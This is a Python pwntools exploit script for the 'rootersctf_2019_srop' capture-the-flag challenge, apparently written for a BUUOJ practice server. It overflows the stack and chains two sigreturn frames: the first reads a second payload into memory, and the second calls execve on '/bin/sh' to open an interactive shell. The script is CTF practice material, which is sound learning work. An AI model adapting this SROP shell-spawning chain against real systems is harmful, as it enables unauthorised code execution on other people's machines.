import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='rootersctf_2019_srop'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',27139)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		io.recv()
		pop_rax_syscall=0x401032
		syscall=0x401033
		pay='a'*0x88+p64(pop_rax_syscall)
		pay+=p64(0xf)
		srop=SigreturnFrame()
		srop.rax=0
		srop.rsp=0x402000+0x200
		srop.rdi=0
		srop.rsi=0x402000+0x100
		srop.rdx=0x300
		srop.rbp=0x402000+0x200-8
		srop.rip=syscall
		pay+=str(srop)
		io.sendline(pay)
		# io.recv()
		pay='/bin/sh\x00'.ljust(0x100,'\x00')+p64(pop_rax_syscall)
		pay+=p64(0xf)
		srop=SigreturnFrame()
		srop.rax=0x3b
		srop.rsp=0x402000+0x200
		srop.rdi=0x402000+0x100
		srop.rsi=0
		srop.rdx=0
		srop.rbp=0x402000+0x200-8
		srop.rip=syscall
		pay+=str(srop)
		io.send(pay)



		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['execve']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue